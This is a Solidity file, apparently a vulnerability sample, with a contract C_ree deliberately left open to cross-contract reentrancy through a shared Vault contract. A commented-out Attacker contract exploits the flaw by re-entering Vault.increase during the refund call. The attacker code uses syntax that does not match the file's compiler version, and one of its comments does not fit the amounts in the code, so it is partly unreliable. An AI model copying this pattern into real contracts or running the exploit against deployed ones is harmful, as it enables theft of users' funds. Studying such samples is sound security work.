// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

contract C_ree {
    Vault public  vault;
    bool private locked = false;

    modifier nonReentrant() {
        require(!locked, "Locked");
        locked = true;
        _;
        locked = false;
    }

    constructor(address _vault)  public { vault = Vault(_vault); }

    // the following function is vulnerable to a cross-contract reentrancy attack
    function redeem(address payable to) external nonReentrant {
        vault.setEnabled(true); 

        uint256 amt = vault.takeAll(to);

        // here an attacker can enter the Vault contract and call its functions that requires the enabled flag
        (bool success, ) = to.call.value(amt)(""); 
        require(success, "Refund failed");

        vault.setEnabled(false);
    }

    function() external payable {
        vault.setEnabled(true); 
        vault.increase(msg.sender, msg.value);
        vault.setEnabled(false);
    }
}

contract Vault {
    mapping(address => uint256) private balances; 
    address private admin;
    bool private enabled;

    modifier onlyAdmin() { require(msg.sender == admin, "Only admin can enable vault"); _; }

    function setAdmin(address a) external {
        require(admin == address(0), "Invalid address");
        admin = a;
    }

    function setEnabled(bool b) external onlyAdmin { enabled = b; }

    function increase(address a, uint256 amt) external {
        require(enabled, "Vault disabled");
        balances[a] += amt;
    }

    function takeAll(address a) external returns (uint256) {
        require(enabled, "Vault disabled");
        uint256 r = balances[a];
        balances[a] = 0;
        return r;
    }
}

// Contract C contains a cross-contract reentrancy vulnerability that can be exploited by an attacker.
// Specifically, the attacker can enter the Vault contract and invoke the `increase` function
// during the execution of the `redeem` function, which pays back funds. This allows the attacker
// to manipulate the contract's state and potentially drain funds.

// contract Attacker {
//     Vault public  vault;
//     C_ree public  c;
//     bool flag = true;

//     constructor(address _vault, address payable _c) payable public  {
//         vault = Vault(_vault);
//         c = C_ree(_c);
//     }

//     function attack() public {
//         (bool success,) = address(c).call{value: 1 ether}("");
//         require(success);
//         c.redeem((address(this)));
//         c.redeem((address(this)));  // the second redeem() will pay 1000
//     }

//     function() external payable {
//         if (flag) {
//             flag = false;
//             vault.increase(address(this), 2 ether);
//         }
//     }

// }